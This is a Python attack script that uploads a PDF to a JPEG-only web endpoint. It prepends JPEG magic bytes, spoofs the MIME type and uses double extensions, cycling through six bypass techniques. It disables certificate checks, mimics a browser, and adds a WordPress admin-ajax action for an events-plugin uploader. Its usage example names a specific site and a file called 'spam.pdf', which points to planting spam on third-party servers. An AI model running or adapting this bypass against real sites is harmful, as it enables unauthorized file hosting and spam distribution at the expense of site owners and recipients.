#!/usr/bin/env python3
"""
Upload a PDF to a JPEG-only endpoint by spoofing MIME type + magic bytes.

Usage:
    python pdf_uploader.py <UPLOAD_URL> <PDF_FILE> [--field <field_name>]

Examples:
    python pdf_uploader.py "https://sinvacc.org/wp-admin/admin-ajax.php" spam.pdf
    python pdf_uploader.py "https://example.com/upload" spam.pdf --field upload
"""

import sys
import ssl
import uuid
import urllib.request
import urllib.error
import os

# JPEG magic bytes (JFIF header) — prepended to trick server-side content sniffing
JPEG_HEADER = (
    b'\xFF\xD8\xFF\xE0'       # SOI + APP0 marker
    b'\x00\x10'                # Length of APP0 segment
    b'JFIF\x00'               # JFIF identifier
    b'\x01\x01'               # Version 1.1
    b'\x00'                   # Aspect ratio units (0 = no units)
    b'\x00\x01\x00\x01'      # X/Y density
    b'\x00\x00'               # No thumbnail
)


def build_multipart(field_name, filename, content_type, file_bytes, extra_fields=None):
    """Build multipart/form-data body."""
    boundary = 'UploadBoundary' + uuid.uuid4().hex[:12]
    body = b''
    if extra_fields:
        for k, v in extra_fields.items():
            body += f'--{boundary}\r\n'.encode()
            body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
    body += f'--{boundary}\r\n'.encode()
    body += f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
    body += f'Content-Type: {content_type}\r\n\r\n'.encode()
    body += file_bytes + b'\r\n'
    body += f'--{boundary}--\r\n'.encode()
    return body, f'multipart/form-data; boundary={boundary}'


def upload(url, pdf_path, field_name='file'):
    """Try multiple bypass techniques and report which one works."""
    with open(pdf_path, 'rb') as f:
        pdf_bytes = f.read()

    pdf_name = os.path.basename(pdf_path)
    base_name = os.path.splitext(pdf_name)[0]

    # SSL context (ignore cert errors for testing)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    # ── Techniques to try ──
    techniques = [
        {
            "name": "JPEG magic bytes + .jpg extension + image/jpeg MIME",
            "filename": base_name + ".jpg",
            "content_type": "image/jpeg",
            "payload": JPEG_HEADER + pdf_bytes,
        },
        {
            "name": "Raw PDF + .jpg extension + image/jpeg MIME (header-only spoof)",
            "filename": base_name + ".jpg",
            "content_type": "image/jpeg",
            "payload": pdf_bytes,
        },
        {
            "name": "JPEG magic bytes + .pdf extension + image/jpeg MIME",
            "filename": pdf_name,
            "content_type": "image/jpeg",
            "payload": JPEG_HEADER + pdf_bytes,
        },
        {
            "name": "Raw PDF + .pdf extension + image/jpeg MIME (MIME-only spoof)",
            "filename": pdf_name,
            "content_type": "image/jpeg",
            "payload": pdf_bytes,
        },
        {
            "name": "Raw PDF + .pdf.jpg double extension + image/jpeg MIME",
            "filename": base_name + ".pdf.jpg",
            "content_type": "image/jpeg",
            "payload": pdf_bytes,
        },
        {
            "name": "Raw PDF + .jpg.pdf double extension + application/pdf MIME",
            "filename": base_name + ".jpg.pdf",
            "content_type": "application/pdf",
            "payload": pdf_bytes,
        },
    ]

    # Auto-detect extra fields for known WordPress endpoints
    extra_fields = None
    if 'admin-ajax.php' in url:
        extra_fields = {'action': 'em_upload'}
        print(f"[*] Detected admin-ajax.php — adding action=em_upload")

    print(f"[*] Target: {url}")
    print(f"[*] PDF: {pdf_path} ({len(pdf_bytes)} bytes)")
    print(f"[*] Upload field: {field_name}")
    print(f"[*] Trying {len(techniques)} bypass techniques...\n")

    for i, tech in enumerate(techniques, 1):
        print(f"[{i}/{len(techniques)}] {tech['name']}")
        body, ct_header = build_multipart(
            field_name, tech['filename'], tech['content_type'],
            tech['payload'], extra_fields
        )
        headers = {
            'Content-Type': ct_header,
            'User-Agent': ua,
        }
        req = urllib.request.Request(url, data=body, headers=headers, method='POST')

        try:
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            status = resp.getcode()
            resp_body = resp.read(1024 * 1024).decode('utf-8', errors='replace')
            print(f"    HTTP {status}")
            print(f"    Response: {resp_body[:300]}")

            # Check for success indicators
            success_words = ['success', 'uploaded', '"url"', '"link"', '"path"', 'source_url', 'attachment_id']
            if any(w in resp_body.lower() for w in success_words):
                print(f"\n[+] UPLOAD LIKELY SUCCEEDED with technique: {tech['name']}")
                print(f"    Full response:\n{resp_body[:1000]}")
                return True

        except urllib.error.HTTPError as e:
            resp_body = ''
            try:
                resp_body = e.read(1024 * 1024).decode('utf-8', errors='replace')
            except:
                pass
            print(f"    HTTP {e.code}: {resp_body[:200]}")

        except Exception as e:
            print(f"    Error: {e}")

        print()

    print("[!] All techniques returned non-success responses.")
    print("    The endpoint may require authentication or use deep content validation.")
    return False


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)

    target_url = sys.argv[1]
    pdf_file = sys.argv[2]

    field = 'file'
    if '--field' in sys.argv:
        idx = sys.argv.index('--field')
        if idx + 1 < len(sys.argv):
            field = sys.argv[idx + 1]

    if not os.path.isfile(pdf_file):
        print(f"Error: PDF file not found: {pdf_file}")
        sys.exit(1)

    upload(target_url, pdf_file, field)
